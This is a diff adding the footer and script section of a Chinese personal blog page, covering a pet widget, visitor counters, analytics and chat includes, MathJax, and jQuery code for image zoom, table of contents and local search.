+</div>
+<!-- City�氲װ��������� -->
+
+ 
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large red">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect brown" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse indigo"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>	
+  </div>
+	
+    </main>
+    
+  
+
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/jquery.min.js"></script>
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/spig.js"></script>
+<link rel="stylesheet" href="http://imagestp.cfyqy.com/cfyqy/pet/css/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+<div >
+<!--小人只在首页显示 start*-->
+<div id="spig" class="spig">
+    <div id="message">正在加载中……</div>
+    <div id="mumu" class="mumu"></div>
+</div>
+</div>
+<!--小人end*-->
+ 
+<footer class="page-footer indigo darken-1 darken-1">
+	
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+           
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+    <div class="footer-copyright red-link-context">
+        <div class="container">
+            © just do !
+        </div>
+    </div>
+	
+</footer>
+
+	
+
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>
+  <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass(' lighten-2');
+
+            
+            // 添加new标签
+            $('.menu-reading, .menu-about').append('<span class="new badge red"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', '119424621', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/javascript" src="http://tajs.qq.com/stats?sId=65311650" charset="UTF-8"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+	
+</body>
+</html>
